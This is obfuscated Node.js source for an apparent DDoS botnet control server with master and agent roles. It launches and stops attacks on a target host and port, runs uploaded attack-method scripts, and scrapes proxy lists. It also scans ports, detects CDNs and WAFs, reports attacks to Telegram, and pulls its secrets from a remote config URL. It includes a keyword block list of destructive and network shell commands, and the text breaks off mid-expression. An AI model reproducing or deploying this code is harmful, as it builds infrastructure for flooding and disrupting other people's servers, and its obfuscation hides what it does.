const _0x214aff=_0x55b4;(function(_0x7b0f65,_0x271ee3){const _0x50b5a3=_0x55b4,_0x88b163=_0x7b0f65();while(!![]){try{const _0x5c408b=parseInt(_0x50b5a3(0x20a))/0x1*(-parseInt(_0x50b5a3(0x16d))/0x2)+-parseInt(_0x50b5a3(0x85))/0x3+parseInt(_0x50b5a3(0x19b))/0x4*(parseInt(_0x50b5a3(0x239))/0x5)+parseInt(_0x50b5a3(0x13d))/0x6+-parseInt(_0x50b5a3(0x1cd))/0x7+-parseInt(_0x50b5a3(0x25c))/0x8*(parseInt(_0x50b5a3(0x1de))/0x9)+-parseInt(_0x50b5a3(0x1c1))/0xa*(-parseInt(_0x50b5a3(0xa0))/0xb);if(_0x5c408b===_0x271ee3)break;else _0x88b163['push'](_0x88b163['shift']());}catch(_0x4ab85a){_0x88b163['push'](_0x88b163['shift']());}}}(_0x4958,0x2091b));const os=require('os'),fs=require('fs'),path=require(_0x214aff(0xdd)),express=require(_0x214aff(0xdf)),http=require(_0x214aff(0x279)),crypto=require(_0x214aff(0x21c)),{execSync,spawn}=require('child_process'),multer=require(_0x214aff(0x22f)),axios=require('axios'),FormData=require(_0x214aff(0x94)),whois=require('whois-json'),net=require(_0x214aff(0x106)),bcrypt=require(_0x214aff(0x173)),pidusage=require(_0x214aff(0x234)),localtunnel=require(_0x214aff(0x23b)),cookieParser=require(_0x214aff(0x138)),cookieSignature=require(_0x214aff(0x23f)),ngrok=require(_0x214aff(0x25d)),WebSocket=require('ws'),winston=require(_0x214aff(0xc9)),dns=require('dns')[_0x214aff(0x1b6)],fetch=(..._0x2c28df)=>import(_0x214aff(0x8a))[_0x214aff(0x141)](({default:_0x4066e7})=>_0x4066e7(..._0x2c28df));process['on']('uncaughtException',_0x2284fb=>{const _0x1bf830=_0x214aff;console[_0x1bf830(0x251)](_0x1bf830(0x1be),_0x2284fb),process[_0x1bf830(0x193)](0x1);}),process['on'](_0x214aff(0x16b),(_0x46a5a3,_0x189c7c)=>{const _0x1e6f57=_0x214aff;console[_0x1e6f57(0x251)](_0x1e6f57(0x10c),_0x46a5a3),process[_0x1e6f57(0x193)](0x1);});const CONFIG_URL=process[_0x214aff(0x156)][_0x214aff(0x144)]||_0x214aff(0x101),port=process[_0x214aff(0x156)][_0x214aff(0xb7)]||process[_0x214aff(0x156)][_0x214aff(0x76)]||0x82a,NODE_TYPE=process['env'][_0x214aff(0x1b8)]||_0x214aff(0x269),AUTO_DELETE_AGENT=process[_0x214aff(0x156)][_0x214aff(0x1ee)]===_0x214aff(0x12b),MASTER_ATTACK_SELF=process['env'][_0x214aff(0xc6)]===_0x214aff(0x12b);let SUPABASE_URL='',SUPABASE_API_KEY='',MASTER_URL='',TELEGRAM_BOT_TOKEN='',TELEGRAM_CHAT_ID='',apiKey='',AGENT_KEY='',DEFAULT_PHOTO_URL='',COOKIE_SECRET='',NGROK_TOKEN='',supabase=null;const methodsPath=path['join'](__dirname,'methods.json'),agentsPath=path[_0x214aff(0x84)](__dirname,_0x214aff(0x25f)),historyPath=path[_0x214aff(0x84)](__dirname,_0x214aff(0x253)),uploadDir=path[_0x214aff(0x84)](__dirname,_0x214aff(0x232),_0x214aff(0x136)),fingerprintFile=path['join'](__dirname,_0x214aff(0x81)),MAX_FILE_SIZE=0x15e*0x400,DANGEROUS_KEYWORDS=[_0x214aff(0x1d6),_0x214aff(0x169),_0x214aff(0xe4),_0x214aff(0x1d9),_0x214aff(0x194),':(){:|:&};:',_0x214aff(0x88),_0x214aff(0x265),_0x214aff(0x133),_0x214aff(0xf2),_0x214aff(0x125),_0x214aff(0x1ab),_0x214aff(0x13b),'forkbomb',_0x214aff(0x143),_0x214aff(0xd1),_0x214aff(0x151),_0x214aff(0xee),_0x214aff(0xe6)];if(!fs[_0x214aff(0x18b)](uploadDir))fs[_0x214aff(0xb6)](uploadDir,{'recursive':!![]});const SCRAPE_SOURCES=[{'url':_0x214aff(0x237),'proto':'http'},{'url':_0x214aff(0x164),'proto':_0x214aff(0x13a)},{'url':_0x214aff(0x1f8),'proto':_0x214aff(0xd6)},{'url':_0x214aff(0x257),'proto':_0x214aff(0x279)},{'url':_0x214aff(0x26b),'proto':_0x214aff(0x272)},{'url':'https://raw.githubusercontent.com/casa-ls/proxy-list/refs/heads/main/socks5','proto':'socks5'},{'url':_0x214aff(0x1b5),'proto':_0x214aff(0x272)},{'url':_0x214aff(0x18e),'proto':_0x214aff(0xd6)},{'url':_0x214aff(0x145),'proto':_0x214aff(0xd6)},{'url':'https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt','proto':_0x214aff(0x235)},{'url':_0x214aff(0x1fc),'proto':_0x214aff(0x235)}],{createLogger,transports}=winston,{combine,timestamp,printf}=winston[_0x214aff(0x1b0)],logger=createLogger({'level':'info','format':combine(timestamp(),printf(({timestamp:_0x38b9ae,level:_0x2bdc11,message:_0x446e2d,..._0x3c7a7e})=>'['+_0x38b9ae+_0x214aff(0xd9)+_0x2bdc11['toUpperCase']()+']\x20'+_0x446e2d+'\x20'+(Object[_0x214aff(0x178)](_0x3c7a7e)[_0x214aff(0x230)]?JSON[_0x214aff(0x1f1)](_0x3c7a7e):''))),'transports':[new transports[(_0x214aff(0x1d4))]({'filename':'activity.log','maxsize':0x5*0x400*0x400,'maxFiles':0x3})]});let AGENT_LIST=[],localTunnelUrl=null,currentTunnel=null,LAST_REGISTERED={'name':null,'url':null};const activeProcesses={},stats={};function generateOrReadFingerprint(){const _0x418613=_0x214aff;try{if(fs[_0x418613(0x18b)](fingerprintFile)){const _0x3ba6d7=fs[_0x418613(0x267)](fingerprintFile,_0x418613(0xf0))['trim']();if(_0x3ba6d7['length']===0x40)return _0x3ba6d7;}}catch(_0x2db4c0){logActivity(_0x418613(0x131),{'error':_0x2db4c0['message']});}const _0x49dd25=os[_0x418613(0xe0)]()+':'+os[_0x418613(0x1c6)]()+':'+port+':'+Date['now']()+':'+crypto[_0x418613(0x1aa)](0x6)[_0x418613(0xd4)]('hex'),_0x322de5=crypto[_0x418613(0x210)](_0x418613(0x11c))['update'](_0x49dd25)[_0x418613(0x1d3)](_0x418613(0xae));try{fs[_0x418613(0x14c)](fingerprintFile,_0x322de5);}catch(_0x5b1772){logActivity(_0x418613(0x1ed),{'error':_0x5b1772['message']});}return _0x322de5;}const AGENT_FINGERPRINT=generateOrReadFingerprint();function validateApiKey(_0x29d7e0,_0x1cd4c2,_0x3ceb33){const _0x489d74=_0x214aff,_0x4ce437=_0x29d7e0[_0x489d74(0x123)][_0x489d74(0x105)]||_0x29d7e0[_0x489d74(0x1f9)]['key'];if(!_0x4ce437)return _0x1cd4c2[_0x489d74(0x23d)](0x190)['json']({'error':_0x489d74(0x273)});if(_0x4ce437!==apiKey&&_0x4ce437!==AGENT_KEY)return _0x1cd4c2['status'](0x193)['json']({'error':'API\x20key\x20tidak\x20valid'});_0x3ceb33();}function validateFileName(_0x4b3ef2,_0xe63ecb,_0x8cf6b){const _0x17871e=_0x214aff,_0x59c70c=_0x4b3ef2[_0x17871e(0x73)][_0x17871e(0x12f)]||_0x4b3ef2['body']['filename']||_0x4b3ef2[_0x17871e(0x1f9)][_0x17871e(0x126)];if(!isValidFileName(_0x59c70c))return _0xe63ecb[_0x17871e(0x23d)](0x190)[_0x17871e(0x207)]({'error':_0x17871e(0x1ea)});_0x8cf6b();}function requireLogin(_0x3d3460,_0x4d1e36,_0x5e30fc){const _0x4cf790=_0x214aff,_0x3c218d=_0x3d3460[_0x4cf790(0x1bd)]?.['user'];if(!_0x3c218d)return _0x4d1e36['status'](0x191)[_0x4cf790(0x207)]({'error':_0x4cf790(0x18d)});const _0x574ce7=cookieSignature[_0x4cf790(0x1c0)](_0x3c218d,COOKIE_SECRET);if(!_0x574ce7)return _0x4d1e36['status'](0x191)[_0x4cf790(0x207)]({'error':'Cookie\x20tidak\x20valid'});_0x3d3460['user']=_0x574ce7,_0x5e30fc();}function handleUploadCollisionAndMove(_0x2bef8d,_0x175687){const _0x1fceb4=_0x214aff,_0x3f0507=path[_0x1fceb4(0x9f)](_0x2bef8d),_0x5a9483=path['basename'](_0x2bef8d,_0x3f0507);let _0x32b4f2=_0x2bef8d,_0x5bcd24=path[_0x1fceb4(0x84)](uploadDir,_0x32b4f2),_0xa0b7fa=0x1;while(fs[_0x1fceb4(0x18b)](_0x5bcd24)){_0x32b4f2=_0x5a9483+'_'+_0xa0b7fa+_0x3f0507,_0x5bcd24=path[_0x1fceb4(0x84)](uploadDir,_0x32b4f2),_0xa0b7fa++;}return fs[_0x1fceb4(0x201)](_0x175687,_0x5bcd24),{'finalName':_0x32b4f2,'destPath':_0x5bcd24};}function sandboxCommandExecution(_0x55be7b,_0x4f0463){return spawn('node',[_0x55be7b,..._0x4f0463]);}function safeWriteFile(_0x4499d8,_0xba96f9){const _0x5778b3=_0x214aff;try{const _0x5441b0=_0x4499d8+_0x5778b3(0x121);fs[_0x5778b3(0x14c)](_0x5441b0,_0xba96f9),fs[_0x5778b3(0x201)](_0x5441b0,_0x4499d8);}catch(_0x973b19){logActivity('SAFE_WRITE_FAIL',{'filepath':_0x4499d8,'error':_0x973b19[_0x5778b3(0x139)]});}}function escapeTelegram(_0x528e7c){const _0x48aaa6=_0x214aff;if(!_0x528e7c)return'';return _0x528e7c[_0x48aaa6(0x112)](/[_*[\]()`~>#\+\-=|{}.!]/g,_0x48aaa6(0xeb));}function isValidFileName(_0x392a73){const _0x492fb5=_0x214aff;return/^[a-zA-Z0-9_\-\.]+$/[_0x492fb5(0xe9)](_0x392a73)&&!_0x392a73['includes']('..')&&!_0x392a73['startsWith']('.');}function logActivity(_0xf66842,_0x48786){logger['info'](_0xf66842,_0x48786);}function readFileJsonSafe(_0x1451dd,_0x6a51f4=null){const _0x51c36c=_0x214aff;try{if(!fs[_0x51c36c(0x18b)](_0x1451dd))return _0x6a51f4;return JSON['parse'](fs[_0x51c36c(0x267)](_0x1451dd,_0x51c36c(0xf0)));}catch(_0x36dca5){return logActivity(_0x51c36c(0xfb),{'filepath':_0x1451dd,'error':_0x36dca5[_0x51c36c(0x139)]}),_0x6a51f4;}}function writeFileJsonSafe(_0xa9da71,_0x48687d){const _0x304758=_0x214aff;try{if(_0x48687d===undefined||_0x48687d===null)throw new Error(_0x304758(0x7d));const _0x3cc651=JSON['stringify'](_0x48687d,null,0x2);safeWriteFile(_0xa9da71,_0x3cc651);}catch(_0x1c335c){logActivity(_0x304758(0x18a),{'filepath':_0xa9da71,'error':_0x1c335c[_0x304758(0x139)]});}}function readHistory(){return readFileJsonSafe(historyPath,[]);}function writeHistory(_0x28a671){writeFileJsonSafe(historyPath,_0x28a671);}function _0x4958(){const _0x30e259=['Terjadi\x20kesalahan\x20server.','TUNNEL_URL_CHANGED','forEach','lastResponse','1231216ryryub','exitCode','/api/agents','ALL','dashboard.html','code','digest','File','Server','rm\x20','NGROK_TOKEN','org','shutdown','BLOCK_UPLOAD','🎯\x20*Port:*\x20`','[CONFIG]\x20Semua\x20percobaan\x20fetch\x20gagal.\x20Exit...','isArray','4032htQnRj','Method\x20dihapus','tags','FETCH_ERROR','AUTO_SYNC_PROXY_TXT_FAIL','times','Country','originalname','getHeaders','AGENT_DISABLED','cpu','agent_deleted','Nama\x20file\x20tidak\x20valid','🚫\x20*Upload\x20file\x20diblokir*\x0a','split','FINGERPRINT_WRITE_ERROR','AUTO_DELETE_AGENT','SEND_TELEGRAM_PHOTO_ERR','x-cdn','stringify','Agent\x20tidak\x20ditemukan','agent_update','Durasi\x20waktu\x20harus\x20berupa\x20angka\x20positif','*Nama:*\x20`','readdirSync','unknown','https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all','body','/api/attack/history','AGENT_KEY','https://spys.me/proxy.txt','<port>','redirect','server','rps','renameSync','*File:*\x20`','Access-Control-Allow-Headers','x-sucuri-id','all_stopped','freemem','json','GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS','fingerprint','83281RVsMtM','Status\x20code\x20','Scrape\x20proxy\x20selesai','RECEIVE_PROXY_UPDATE_VALIDATED','role','ERROR_ATTACK','createHash','AGENT_URL_AUTO_UPDATED','Tidak\x20ada\x20file\x20ter-upload','all','AUTO_REGISTER_MASTER','/api/attack/stop','pipe','cloudflare','Gagal\x20membaca\x20direktori','🔥\x20*Serangan\x20dimulai\x20(','longitude','asn','crypto','*PID:*\x20`','master','🆔\x20*Process\x20ID:*\x20`','[WS\x20ERROR]\x20Gagal\x20kirim\x20ke\x20client:','cf-ray','production','assign','TUNNEL_503_DETECTED','AUTO_SYNC_METHODS_JSON_FAIL','CDN\x20-\x20','<time>','get','TIMEOUT','find','Kesalahan\x20Internal\x20Server','terminate','success','Nama\x20file\x20tidak\x20diizinkan.','multer','length','diskStorage','lib','enabled','pidusage','mix','AGENT_HEALTH_LOOP_ERROR','https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all','Parameter\x20oldName\x20dan\x20newName\x20diperlukan','638035ReLdvo','warn','localtunnel','uptime','status','srv','cookie-signature','activity.log','SUPABASE_API_KEY','byProto','Ekstensi\x20file\x20tidak\x20diizinkan:\x20','Strict','•\x20`','TUNNEL_RESTART_FAIL','Parameter\x20salah\x20atau\x20API\x20key\x20tidak\x20valid','):\x20','stdout','AGENT_DELETE_METHOD_FILE','Format\x20JSON\x20tidak\x20valid.','_tempPps','whois','has','Ukuran\x20file\x20terlalu\x20besar.\x20Maks\x20350KB.','OPEN','error','AGENT_ADDED','attack_history.json','target','[AGENT]\x20Tunnel\x20berhasil\x20dibuat\x20ulang:','boolean','https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/http/http.txt','Parameter\x20filename\x20diperlukan','origin','/lib/method','BLOCK_UPLOAD_FILENAME','1688EazkUW','ngrok','readdir','agents.json','setHeader','user','/api/agents/register','https://ipwho.is/','AUTO_SYNC_METHOD_FILE','dd\x20','pps','readFileSync','\x22\x20tidak\x20ditemukan','agent','[AGENT]\x20Tunnel\x20error\x20503\x20detected!\x20Restarting\x20tunnel...','https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt','WS_SEND_FAIL','lastOnline','RECEIVE_UPDATE_OTHER','response','AGENT_DELETED_OFFLINE','Upload\x20error:\x20','socks5','API\x20key\x20wajib\x20disediakan','Host\x20tidak\x20diberikan','[CONFIG]\x20Konfigurasi\x20berhasil\x20dimuat.','values','/api/method-files/:filename','⏱️\x20*Durasi:*\x20`','http','createServer','server.js','params','.html','SPAWN_SCRIPT_MISSING','SERVER_PORT','oldName','headers','some','crashed','_tempBps','slice','Data\x20kosong\x20atau\x20tidak\x20valid','AUTO_SYNC_PROXY_TXT','[AGENT]\x20Tunnel\x20mati,\x20mencoba\x20recovery...','type','agent_fingerprint.txt','/api/methods/:oldName','localhost','join','743775GfTxKc','connect','finish','mkfs','scriptName','node-fetch','geo','File\x20berhasil\x20disimpan','SERVER\x20ONLINE:\x20http://','login.html','LIMIT_UNEXPECTED_FILE','use','MarkdownV2','❗️\x20*Proses\x20error*\x0a','File\x20proxy\x20tidak\x20valid\x20atau\x20terlalu\x20sedikit\x20baris\x20yang\x20sesuai\x20format\x20IP:PORT.','form-data','data','append','\x0a```','online','Port\x20harus\x20berupa\x20angka\x201-65535','proxy.txt\x20not\x20found','\x20bytes`','delete','DELETE_METHOD_FILE_AUTO','MulterError','extname','11DePvUJ','round','``\x0a','PROCESS_EXITED','_tempRps','*/*','/api/activity-log','startsWith','`:\x20*','endsWith','Sudah\x20terdaftar','[MASTER]\x20Ngrok\x20tunnel\x20aktif:','EDIT_METHOD_FILE','/api/method-files/download/:filename','hex','open','idle','.sh','[Unknown\x20Error\x20Handler]','wafDetection','proto','single','mkdirSync','PORT','now','SYNC_DELETE_METHOD_FILE','select','[AGENT]\x20Tunnel\x20closed.\x20Attempting\x20to\x20restart...','once','@supabase/supabase-js','connection','File\x20update\x20diterima','args','bps','from','/login','urlInfo','File\x20dengan\x20nama\x20baru\x20sudah\x20ada','MASTER_ATTACK_SELF','dnsInfo','File\x20berhasil\x20di-upload','winston','/api/uploadmeth','/api/agents/health','Agent\x20dengan\x20nama\x20ini\x20sudah\x20ada','Gagal\x20membaca\x20isi\x20file','Nama\x20dan\x20URL\x20wajib\x20diisi','isp','COOKIE_SECRET','chown\x20','username,\x20password,\x20role','Nama\x20file\x20berhasil\x20diubah','toString','Offline\x20>\x203\x20menit','socks4','SAVE_METHOD','/api/agents/:name',']\x20[','Hanya\x20master!','file','null\x20url','path','🛡️\x20*Host:*\x20`','express','hostname','Parameter\x20\x27target\x27\x20diperlukan','RENAME_METHOD_FILE','AGENT_HEALTH_LOOP_ERROR:','sudo\x20','url','passwd','matchAll','UPDATE_METHOD','test','/api/agents/','\x5c$&','http://','entries','userdel','agent_health','utf8','/lib/method/','curl\x20','totalmem','Format\x20salah','memoryMB','LocalTunnel\x20failed\x20(attempt\x20','Username\x20atau\x20password\x20salah','size','AGENT_REGISTER_AUTO','[AGENT]\x20Tunnel\x20restarted\x20and\x20registered\x20to\x20master.','READ_JSON_ERROR','x-powered-by','host','Agent\x20berhasil\x20diperbarui','sendFile','STOP_PROCESS','https://botapi.ihsan83636.workers.dev','lookup','🛑\x20*Proses\x20selesai/stop*\x0a','AUTO_SYNC_METHODS_JSON','key','net','TUNNEL_RESTART_SKIP','rss','loadavg','Lax','/api/attack/stats','[FATAL]\x20Unhandled\x20Rejection:','api.js','Content-Type,\x20Authorization','Tipe\x20file\x20tidak\x20diizinkan.','[AGENT]\x20Gagal\x20membuat\x20tunnel\x20baru.\x20Skip\x20dan\x20tunggu\x20percobaan\x20selanjutnya.','[AGENT]\x20Tunnel\x20error\x20503\x20detected\x20(err.response)!\x20Restarting\x20tunnel...','replace','push','stack','[Custom\x20Error\x20Handler]','resolve','download','script','\x1b[31m%s\x1b[0m','Akamai','GET_PUBLIC_IP_FAIL','sha256','MASTER_ATTACK','SUPABASE_URL','TELEGRAM_CHAT_ID','START_ATTACK','.tmp','/api/fingerprint-full','query','users','nc\x20','newName','DEFAULT_PHOTO_URL','Update\x20didistribusikan','[AGENT]\x20Gagal\x20recovery\x20tunnel:','No\x20tunnel\x20URL\x20after\x20retries','false','agent_status_update','createWriteStream','toFixed','filename','Upload\x20diblokir:\x20terdeteksi\x20keyword\x20berbahaya\x20(\x22','FINGERPRINT_READ_ERROR','Access-Control-Allow-Methods','wget\x20','failed','https://api.ipify.org?format=json','method','LIMIT_FILE_SIZE','cookie-parser','message','https','python\x20-m\x20http.server','index.js','224406duPWuC','pid','AUTO_MIRROR_REMOVE_FILE','Gagal\x20fingerprint','then','running','chmod\x20777\x20/','CONFIG_URL','https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt','readyState','Agent\x20terdaftar','AGENT_RE_ENABLED','set','openPorts','Serangan\x20dimulai\x20(','writeFileSync','File\x20sudah\x20tidak\x20ada','[CONFIG]\x20Gagal\x20ambil\x20config\x20(percobaan\x20','TELEGRAM_BOT_TOKEN','/upload','useradd','supabase','/api/method-files','Gagal\x20menyimpan\x20file','authtoken','env','/api/methods/delete-file','apiKey','*Process\x20ID:*\x20`','text','splice','clear','filter','listen','Ekstensi\x20file\x20tidak\x20dikenali:\x20','clients','address','[AGENT]\x20Gagal\x20close\x20tunnel\x20sebelumnya:','static','https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/https/https.txt','unshift','Socket','Agent\x20URL\x20via\x20LocalTunnel:','AUTO_REGISTER_FETCH_FAIL','rm\x20-','string','unhandledRejection','proxy.txt','6cyzsiV','File\x20tidak\x20ditemukan','/proxy.txt','*Exit\x20code:*\x20`','text/plain','password','bcrypt','admin','HEAD','kill','srv1','keys','*Keyword\x20berbahaya\x20terdeteksi:*\x20`','NGROK_START_FAIL','Akses\x20ke\x20path\x20tidak\x20diizinkan:\x20','FETCH_CONFIG_FAIL','put','PROCESS_CRASHED','country','setTimeout','https://api.telegram.org/bot','*Ukuran:*\x20`','🔢\x20*PID:*\x20`','toISOString','💥\x20*Proses\x20crash*\x0a','🛑\x20*STOP\x20broadcast\x20ke\x20agents\x20&\x20master:*\x0a','MASTER_URL','LocalTunnel\x20tidak\x20mengembalikan\x20URL','catch','WRITE_JSON_ERROR','existsSync','Gagal\x20konek\x20LocalTunnel\x20setelah\x20beberapa\x20percobaan.\x20Server\x20tetap\x20berjalan.','Login\x20diperlukan','https://raw.githubusercontent.com/Vann-Dev/proxy-list/refs/heads/main/proxies/socks4.txt','SIGINT','createReadStream','signal','Script\x20file\x20\x22','exit','reboot','includes','function','abort','_interval','/api/methods','close','4QIcpmF','toLowerCase','stream','SPAWN_SCRIPT_PATH_ESCAPE','username','log','map','/api/health','post','Gagal\x20memeriksa\x20host','floor','x-akamai-transformed','trim','Attack\x20history\x20cleared.','/api/login','randomBytes','netcat','AGENT_DELETED','unlinkSync','\x1b[32m%s\x1b[0m','/api/attack','format','.js','\x0a\x20\x20\x20\x20<h2>Upload\x20File\x20Method</h2>\x0a\x20\x20\x20\x20<form\x20action=\x22/api/uploadmeth\x22\x20method=\x22post\x22\x20enctype=\x22multipart/form-data\x22>\x0a\x20\x20\x20\x20\x20\x20<label>API\x20Key:\x20<input\x20type=\x22text\x22\x20name=\x22key\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<label>Pilih\x20File:\x20<input\x20type=\x22file\x22\x20name=\x22file\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<button\x20type=\x22submit\x22>Upload</button>\x0a\x20\x20\x20\x20</form>\x0a\x20\x20','⚔️\x20*Metode:*\x20`','stopped_by_user','https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks5/socks5.txt','promises','compare','NODE_TYPE','send','/dashboard','attack_stopped','/api/update','cookies','[FATAL]\x20Uncaught\x20Exception:','findIndex','unsign','7365790yEfbdf','Method\x20disimpan','Menutup\x20aplikasi...','curl\x20-s\x20ifconfig.me','name','platform','Semua\x20proses\x20di\x20master\x20&\x20agents\x20dihentikan','TUNNEL_CLOSE_FAIL'];_0x4958=function(){return _0x30e259;};return _0x4958();}function logAttackHistory(_0x191037){const _0x2b5a2f=_0x214aff,_0x426c79=readHistory();_0x426c79[_0x2b5a2f(0x165)](_0x191037),writeHistory(_0x426c79);}function updateAttackHistory(_0x109a7b,_0x178896){const _0x372c62=_0x214aff,_0x435da4=readHistory(),_0x512d6b=_0x435da4[_0x372c62(0x1bf)](_0x564b1d=>_0x564b1d['processId']===_0x109a7b);_0x512d6b!==-0x1&&(Object[_0x372c62(0x223)](_0x435da4[_0x512d6b],_0x178896),writeHistory(_0x435da4));}function loadAgents(){AGENT_LIST=readFileJsonSafe(agentsPath,[]);}function saveAgents(){writeFileJsonSafe(agentsPath,AGENT_LIST);}function readMethods(){return readFileJsonSafe(methodsPath,{});}function writeMethods(_0x45a3dc){writeFileJsonSafe(methodsPath,_0x45a3dc);}function parseProxyLine(_0x3170c2){const _0x165e1d=_0x214aff,_0x263f25=_0x3170c2[_0x165e1d(0x1a7)]()['match'](/^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):\d{2,5}$/);return _0x263f25?_0x263f25[0x0]:null;}async function fetchConfig(_0x5cf138=0x5,_0x3e3164=0x1388){const _0x486e3d=_0x214aff;for(let _0x462220=0x1;_0x462220<=_0x5cf138;_0x462220++){try{const _0x514cad=await fetch(CONFIG_URL,{'timeout':0x2710});if(!_0x514cad['ok'])throw new Error(_0x486e3d(0x20b)+_0x514cad[_0x486e3d(0x23d)]);const _0x2cd308=await _0x514cad[_0x486e3d(0x207)]();SUPABASE_URL=_0x2cd308[_0x486e3d(0x11e)],SUPABASE_API_KEY=_0x2cd308[_0x486e3d(0x241)],MASTER_URL=_0x2cd308[_0x486e3d(0x187)],TELEGRAM_BOT_TOKEN=_0x2cd308[_0x486e3d(0x14f)],TELEGRAM_CHAT_ID=_0x2cd308[_0x486e3d(0x11f)],apiKey=_0x2cd308[_0x486e3d(0x158)]||apiKey,AGENT_KEY=_0x2cd308[_0x486e3d(0x1fb)]||AGENT_KEY,DEFAULT_PHOTO_URL=_0x2cd308[_0x486e3d(0x127)]||DEFAULT_PHOTO_URL,COOKIE_SECRET=_0x2cd308[_0x486e3d(0xd0)]||COOKIE_SECRET,NGROK_TOKEN=_0x2cd308[_0x486e3d(0x1d7)]||NGROK_TOKEN;const {createClient:_0x565a3e}=require(_0x486e3d(0xbd));supabase=_0x565a3e(SUPABASE_URL,SUPABASE_API_KEY),global[_0x486e3d(0x152)]=supabase,console[_0x486e3d(0x1a0)](_0x486e3d(0x275));return;}catch(_0x194e9d){logActivity(_0x486e3d(0x17c),{'attempt':_0x462220,'error':_0x194e9d['message']}),console[_0x486e3d(0x23a)](_0x486e3d(0x14e)+_0x462220+'/'+_0x5cf138+_0x486e3d(0x248)+_0x194e9d[_0x486e3d(0x139)]),_0x462220<_0x5cf138?await new Promise(_0x1bd6d3=>setTimeout(_0x1bd6d3,_0x3e3164)):(console[_0x486e3d(0x251)](_0x486e3d(0x1dc)),process['exit'](0x1));}}}async function scanCommonPorts(_0x38358b,_0xaa5e9b=[0x50,0x1bb,0x15,0x16,0x19,0x35,0x1f90,0x20fb,0xcea]){const _0x56078b=_0x214aff,_0x408b31=[];for(const _0xee5cc2 of _0xaa5e9b){const _0x426aab=await new Promise(_0x222571=>{const _0x249c6d=_0x55b4,_0x4060a4=new net[(_0x249c6d(0x166))]();_0x4060a4[_0x249c6d(0x180)](0x5dc),_0x4060a4['once']('connect',()=>{_0x4060a4['destroy'](),_0x222571(!![]);}),_0x4060a4[_0x249c6d(0xbc)]('timeout',()=>{_0x4060a4['destroy'](),_0x222571(![]);}),_0x4060a4[_0x249c6d(0xbc)](_0x249c6d(0x251),()=>_0x222571(![])),_0x4060a4[_0x249c6d(0x86)](_0xee5cc2,_0x38358b);});if(_0x426aab)_0x408b31[_0x56078b(0x113)]({'port':_0xee5cc2,'status':_0x56078b(0xaf)});}return _0x408b31;}async function sendTelegramPhoto(_0x160fcb,_0x29a578=DEFAULT_PHOTO_URL){const _0x4be7cf=_0x214aff;try{await axios[_0x4be7cf(0x1a3)](_0x4be7cf(0x181)+TELEGRAM_BOT_TOKEN+'/sendPhoto',{'chat_id':TELEGRAM_CHAT_ID,'photo':_0x29a578,'caption':_0x160fcb,'parse_mode':_0x4be7cf(0x91)});}catch(_0x11ee7a){logActivity(_0x4be7cf(0x1ef),_0x11ee7a[_0x4be7cf(0x139)]);}}const storage=multer[_0x214aff(0x231)]({'destination':(_0x1fba95,_0x2433af,_0x2bcee5)=>_0x2bcee5(null,uploadDir),'filename':(_0xc80fc9,_0x8d359a,_0x23e472)=>{const _0x3d95c8=_0x214aff;if(!isValidFileName(_0x8d359a[_0x3d95c8(0x1e5)]))return _0x23e472(new Error(_0x3d95c8(0x1ea)));_0x23e472(null,_0x8d359a[_0x3d95c8(0x1e5)]);}}),upload=multer({'storage':storage,'limits':{'fileSize':MAX_FILE_SIZE},'fileFilter':(_0x13de67,_0xd2acfe,_0x5d379b)=>{const _0x45b166=_0x214aff,_0x4bfa74=path[_0x45b166(0x9f)](_0xd2acfe['originalname'])['toLowerCase'](),_0x2a40a4=[_0x45b166(0x1b1),'.sh'];if(!_0x2a40a4[_0x45b166(0x195)](_0x4bfa74))return _0x5d379b(new Error('Hanya\x20file\x20.js\x20atau\x20.sh\x20yang\x20diizinkan'));if(!isValidFileName(_0xd2acfe[_0x45b166(0x1e5)]))return _0x5d379b(new Error(_0x45b166(0x1ea)));_0x5d379b(null,!![]);}});async function authenticateUser(_0x129acd,_0x4747b0){const _0x314f5d=_0x214aff,{data:_0x3548ab,error:_0x47ea0c}=await supabase[_0x314f5d(0xc2)](_0x314f5d(0x124))[_0x314f5d(0xba)](_0x314f5d(0xd2))['eq'](_0x314f5d(0x19f),_0x129acd)[_0x314f5d(0xb5)]();if(_0x47ea0c||!_0x3548ab)return null;const _0xe5af70=await bcrypt[_0x314f5d(0x1b7)](_0x4747b0,_0x3548ab[_0x314f5d(0x172)]);if(!_0xe5af70)return null;return _0x3548ab;}const app=express(),httpServer=http[_0x214aff(0x27a)](app);app[_0x214aff(0x90)](express[_0x214aff(0x207)]()),app[_0x214aff(0x90)]((_0x266303,_0x42136d,_0x3a81c6)=>{const _0x479ce6=_0x214aff;_0x42136d['setHeader']('Access-Control-Allow-Origin','*'),_0x42136d[_0x479ce6(0x260)](_0x479ce6(0x132),_0x479ce6(0x208)),_0x42136d['setHeader'](_0x479ce6(0x203),_0x479ce6(0x10e)),_0x42136d[_0x479ce6(0x260)]('Cache-Control','public,\x20max-age=5'),_0x3a81c6();}),app['use'](_0x214aff(0x25a),express[_0x214aff(0x163)](uploadDir)),app[_0x214aff(0x90)](cookieParser()),app[_0x214aff(0x90)]((_0x211860,_0xa6a2c9,_0x356a32)=>{const _0x7c69df=_0x214aff;if(_0x211860['path']['endsWith'](_0x7c69df(0x74))&&!_0x211860['cookies']?.[_0x7c69df(0x261)])return _0xa6a2c9[_0x7c69df(0x1fe)](_0x7c69df(0xc3));_0x356a32();});const wss=new WebSocket[(_0x214aff(0x1d5))]({'server':httpServer});function broadcastWS(_0x32c47f){const _0x591e3f=_0x214aff,_0x2f8dc8=typeof 